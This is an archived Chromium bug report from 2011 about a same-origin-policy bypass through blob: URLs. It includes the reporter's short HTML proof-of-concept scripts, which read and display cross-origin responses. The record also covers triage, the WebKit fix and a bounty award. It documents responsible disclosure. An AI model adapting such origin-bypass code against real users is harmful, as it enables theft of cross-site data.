# bypass SOP with blob:

| Field | Value |
|-------|-------|
| **Issue ID** | [40088405](https://issues.chromium.org/issues/40088405) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Internals |
| **Reporter** | ku...@gmail.com |
| **Assignee** | ji...@chromium.org |
| **Created** | 2011-03-02 |
| **Bounty** | $1,000.00 |

## Description

**This template is ONLY for reporting security bugs. Please use a different**  

**template for other types of bug reports.**

**Please see the following link for instructions on filing security bugs:**  

**<http://www.chromium.org/Home/chromium-security/reporting-security-bugs>**

**VULNERABILITY DETAILS**  

**Please provide a brief explanation of the security issue.**

**VERSION**  

**Chrome Version: [x.x.x.x] + [stable, beta, or dev]**  

**Operating System: [Please indicate OS, version, and service pack level]**

**REPRODUCTION CASE**  

**Please include a demonstration of the security bug, such as an attached**  

**HTML or binary file that reproduces the bug when loaded in Chrome. PLEASE**  

**make the file as small as possible and remove any content not required to**  

**demonstrate the bug.**

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

**Type of crash: [tab, browser, etc.]**  

**Crash State: [see link above: stack trace, registers, exception record]**  

**Client ID (if relevant): [see link above]**

## Attachments

- deleted (application/octet-stream, 0 B)
- deleted (application/octet-stream, 0 B)

## Timeline

### ku...@gmail.com (2011-03-02)

Test chrome 11.0.686.1 dev windows xp sp3

testcase.html
====
<a href="data:text/html,<script>var builder = new BlobBuilder();builder.append(%22%3Cscript%3Ex%20%3D%20new%20XMLHttpRequest%28%29%3Bx.open%28%27get%27%2C%20%27http%3A//www.google.com%27%2C%20false%29%3Bx.send%28%29%3Balert%28x.responseText%29%3B%3C%5C/script%3E%22);var blob = builder.getBlob('text/html');var url = window.webkitURL.createObjectURL(blob);location=url</script>">test</a>

click see result


### ku...@gmail.com (2011-03-02)

[Comment Deleted]

### ku...@gmail.com (2011-03-02)

You need open "url" see result

Sigh
chrome allow load blob: yesterday's yesterday but after 11.0.686.1 dev not allow

### ku...@gmail.com (2011-03-02)

Works fine with stable
statble.testcase.htm
====
<a href="data:text/html,<script>var builder = new BlobBuilder();builder.append(%22%3Cscript%3Ex%20%3D%20new%20XMLHttpRequest%28%29%3Bx.open%28%27get%27%2C%20%27http%3A//code.jquery.com/jquery-1.5.1.min.js%27%2C%20false%29%3Bx.send%28%29%3Balert%28x.responseText%29%3B%3C%5C/script%3E%22);var blob = builder.getBlob('text/html');var url = createObjectURL(blob);location=url</script>">test</a>

### in...@chromium.org (2011-03-02)

@jianli: this should n't work after your encoding values fix - http://src.chromium.org/viewvc/chrome?view=rev&revision=76432 right ?

### ku...@gmail.com (2011-03-04)

https://crbug.com/chromium/74372 use builder.getBlob this one use builder.append :)


### js...@chromium.org (2011-03-07)

This looks like it is a dupe of https://crbug.com/chromium/74372. However, it demonstrates that you can get a full origin bypass from the web. So, adjusting severity as appropriate on the other bug.

### ku...@gmail.com (2011-03-09)

Not a dupe 
https://crbug.com/chromium/74372 forget to encoding builder.getBlob values
this one cause by blob:null/*** do not have a domain 

dev.testcase.htm
====
data:text/html,<script>var builder = new BlobBuilder();builder.append("<script>x%20%3D%20new%20XMLHttpRequest%28%29%3Bx.open%28%27get%27%2C%20%27http://code.jquery.com/jquery-1.5.1.min.js%27%2C%20false%29%3Bx.send%28%29%3Balert%28x.responseText%29%3B<%5C/script>");var blob = builder.getBlob('text/html');var url = window.webkitURL.createObjectURL(blob);document.write('Now visit ' + url)</script>

### ji...@chromium.org (2011-03-09)

Where do you put your test html file? Using local files url?

What do you see?

### ku...@gmail.com (2011-03-09)

[Comment Deleted]

### ku...@gmail.com (2011-03-10)

New demo bypass
"Not allowed to load local resource: blob:"

Works fine with 11.0.696.0 dev :)

### ku...@gmail.com (2011-03-10)

[Empty comment from Monorail migration]

### js...@chromium.org (2011-03-10)

Need to circle back and take a closer look. Moving back to unconfirmed for now.

### js...@chromium.org (2011-03-17)

[Empty comment from Monorail migration]

### js...@chromium.org (2011-03-17)

I don't know if I was seeing timing issues before or what, but I just got this to trigger on trunk with the new repro. It appears the fix for https://crbug.com/chromium/74372 just broke the original repro, but not the root issue. So, reopening.

Assigning to @jianli please ping back if this isn't in your area.

### js...@chromium.org (2011-03-17)

And it did trigger on m10 as well.

### ji...@chromium.org (2011-03-17)

[Empty comment from Monorail migration]

### ji...@chromium.org (2011-03-17)

WebKit bug filed: https://bugs.webkit.org/show_bug.cgi?id=56600
The fix is under review.

### ji...@chromium.org (2011-03-17)

The fix is landed as http://trac.webkit.org/changeset/81399.

### sc...@gmail.com (2011-03-19)

@kuzzcc: congratulations! This is a nice bug, with a great little demo script. Accordingly, it qualifies for a $1000 Chromium Security Reward.

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### sc...@gmail.com (2011-03-19)

Merged to M11: http://trac.webkit.org/changeset/81543

### js...@chromium.org (2011-03-21)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-04-22)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-05-04)

Invoice finalized; payment is in e-payment system; it can take a couple of weeks.

### js...@chromium.org (2011-10-05)

Batch update.

### js...@chromium.org (2012-04-18)

Lifting view restrictions.

### js...@chromium.org (2012-04-18)

[Empty comment from Monorail migration]

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-26)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-26)

This issue was migrated from crbug.com/chromium/74653?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40088405)*
